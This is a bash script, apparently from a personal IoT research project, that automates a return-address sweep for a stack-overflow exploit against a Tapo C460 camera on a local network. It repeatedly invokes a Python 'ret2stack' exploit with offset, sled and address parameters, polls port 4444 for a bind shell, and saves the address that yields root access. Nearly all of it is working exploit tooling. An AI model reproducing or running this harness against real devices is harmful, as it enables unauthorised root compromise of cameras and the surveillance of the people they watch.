#!/bin/bash
cd /Users/jemanuel/projects/franken_surveillance_system
STATE=/tmp/c460_sweep_incremental.idx
[ -s "$STATE" ] && IDX=$(cat "$STATE") || IDX=0
BASE=0xbef80000
STEP=0x400
COUNT=256
LOG=/tmp/c460_incremental_sweep.log
log() { echo "$(date '+%H:%M:%S') $*" >> "$LOG"; }
log "incremental sweep starting from index $IDX"
while [ $IDX -lt $COUNT ]; do
  # check if camera is awake
  if ! ping -c 1 -W 300 192.168.4.33 >/dev/null 2>&1; then
    log "camera asleep, waiting"
    sleep 60
    continue
  fi
  ADDR=$(printf "0x%x" $((BASE + IDX * STEP)))
  # fire the exploit with the current address
  RESULT=$(FORCE=1 timeout 25 sudo -n /opt/homebrew/bin/python3 deliverables/scripts/tapo_connectap_sc.py ret2stack \
    --host 192.168.4.33 --offset 1060 --sled 0 --padpc 1 --sledfill --pcround 0x1000 \
    --addr $ADDR --count 1 --mac 50:3D:D1:E3:E2:07 2>&1 | grep -E "alive|DEAD|SHELL" | tail -1)
  log "$ADDR $RESULT"
  # check for shell
  if nc -z -G 2 192.168.4.33 4444 2>/dev/null; then
    log "SHELL FOUND at $ADDR"
    echo "$ADDR" > /tmp/c460_root_addr.txt
    break
  fi
  # persist the index (survives camera sleep)
  echo $IDX > "$STATE"
  IDX=$((IDX + 1))
  sleep 3
done
log "incremental sweep done"
